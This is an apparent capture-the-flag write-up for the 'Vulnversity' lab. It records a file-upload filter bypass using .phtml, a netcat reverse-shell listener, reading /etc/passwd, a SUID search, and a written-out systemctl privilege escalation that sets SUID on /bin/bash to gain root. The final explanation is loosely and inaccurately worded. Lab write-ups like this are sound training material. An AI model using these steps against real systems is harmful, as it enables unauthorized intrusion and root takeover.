# Vulnversity

> Osama Albawab | April 21 2020

-------------------------------------------

# 10.10.23.243
> 3333/tcp open http
> 10.10.23.243:3333/internal has an upload image form using gobuster we found it
> not allowed extension is .php
> now we try burpsuite intruder with textfile that contains [.php, .php3, .php4, .php5, .phtml]
> we put as well at grep 'Extension not allowed' to see which one is allowed
> phtml is an allowed extension !
> listenning for incoming connections with ' nc -lvnp 9000 '
> we found who runs the web server by ' cat /etc/passwd '
> we found bill and his folder
> now we search for root accessed files with '  find / -perm -4000 2>/dev/null '
> `TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF`
> systemctl enable --now $TF
> bash -p
> and we became the root
> basically what above does is that it moves the access policy of [FILE] to
> our /bin/bash so that we can execute everything we want [[rwsrwxrwx]]



=================================================================
